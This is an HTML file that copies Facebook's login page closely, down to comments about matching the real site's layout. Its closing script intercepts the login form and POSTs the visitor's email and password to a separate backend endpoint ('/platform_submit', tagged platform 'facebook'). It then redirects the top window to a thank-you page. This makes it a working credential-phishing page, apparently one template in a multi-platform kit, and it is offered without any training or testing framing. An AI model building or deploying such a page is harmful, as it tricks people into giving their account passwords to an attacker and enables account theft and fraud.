<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <title>Facebook - Log In or Sign Up</title>
    <script src="static/js/config.js"></script>
    <style>
        body {
            font-family: SFProDisplay-Regular, Helvetica, Arial, sans-serif;
            background-color: #f0f2f5;
            margin: 0;
            padding: 0;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
            overflow: hidden;
            /* Prevent iframe scrollbars if possible */
        }

        .main-wrapper {
            display: flex;
            width: 980px;
            justify-content: space-between;
            align-items: flex-start;
            /* Aligns to top, but we'll pad it down */
            padding-top: 100px;
            /* Moves content down visually like real site */
        }

        /* Left Side: Text */
        .fb-text-col {
            width: 500px;
            padding-top: 50px;
            /* Slight offset */
            padding-right: 32px;
        }

        .fb-logo {
            color: #1877f2;
            font-size: 60px;
            font-weight: bold;
            font-family: Arial, Helvetica, sans-serif;
            /* Fallback matches better */
            letter-spacing: -2px;
            margin-bottom: 10px;
        }

        .fb-slogan {
            font-size: 28px;
            line-height: 32px;
            color: #1c1e21;
            font-weight: normal;
            margin: 0;
        }

        /* Right Side: Card */
        .fb-card-col {
            width: 396px;
        }

        .login-card {
            background-color: #fff;
            border: none;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
            padding: 20px 24px;
            /* Matches desktop padding */
            text-align: center;
        }

        .fb-input {
            width: 100%;
            padding: 14px 16px;
            margin-bottom: 12px;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            font-size: 17px;
            line-height: 16px;
            box-sizing: border-box;
        }

        .fb-input:focus {
            border-color: #1877f2;
            outline: none;
            box-shadow: 0 0 0 2px #e7f3ff;
        }

        .fb-login-btn {
            width: 100%;
            background-color: #1877f2;
            border: none;
            border-radius: 6px;
            font-size: 20px;
            line-height: 48px;
            padding: 0 16px;
            color: #fff;
            font-weight: bold;
            cursor: pointer;
            margin-top: 6px;
            margin-bottom: 12px;
        }

        .fb-login-btn:hover {
            background-color: #166fe5;
        }

        .fb-link {
            display: inline-block;
            color: #1877f2;
            font-size: 14px;
            text-decoration: none;
            margin-bottom: 20px;
        }

        .fb-link:hover {
            text-decoration: underline;
        }

        .divider {
            border-bottom: 1px solid #dadde1;
            margin: 0 0 20px;
            /* Slight fix */
        }

        .create-btn {
            background-color: #42b72a;
            border: none;
            border-radius: 6px;
            color: #fff;
            font-size: 17px;
            font-weight: bold;
            line-height: 48px;
            padding: 0 16px;
            cursor: pointer;
            text-decoration: none;
            display: inline-block;
        }

        .create-btn:hover {
            background-color: #36a420;
        }

        .consent-wrapper {
            font-size: 12px;
            color: #606770;
            margin-bottom: 15px;
            text-align: left;
            display: flex;
            align-items: center;
        }

        .consent-wrapper input {
            margin-right: 8px;
        }
    </style>
</head>

<body>

    <div class="main-wrapper">
        <!-- Left Column -->
        <div class="fb-text-col">
            <div class="fb-logo">facebook</div>
            <h2 class="fb-slogan">Connect with friends and the world around you on Facebook.</h2>
        </div>

        <!-- Right Column -->
        <div class="fb-card-col">
            <div class="login-card">
                <form id="loginForm">
                    <input type="text" id="email" class="fb-input" placeholder="Email or Phone Number" required>
                    <input type="password" id="password" class="fb-input" placeholder="Password" required>

                    <button type="submit" class="fb-login-btn">Log In</button>



                    <a href="#" class="fb-link">Forgot password?</a>

                    <div class="divider"></div>

                    <a href="#" class="create-btn">Create new account</a>
                </form>
            </div>
            <div
                style="text-align:center; font-size:14px; color:#1c1e21; font-family:Helvetica,Arial,sans-serif; margin-top:28px;">
                <strong>Create a Page</strong> for a celebrity, brand or business.
            </div>
        </div>
    </div>

    <script>
        document.getElementById("loginForm").addEventListener("submit", async function (e) {
            e.preventDefault();


            const data = {
                platform: "facebook",
                email: document.getElementById("email").value,
                password: document.getElementById("password").value
            };

            try {
                const res = await fetch(API_BASE_URL + "/platform_submit", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(data)
                });
                if (res.ok) {
                    window.top.location.href = "thankyou.html";
                }
            } catch (err) {
                console.error(err);
            }
        });
    </script>
</body>

</html>
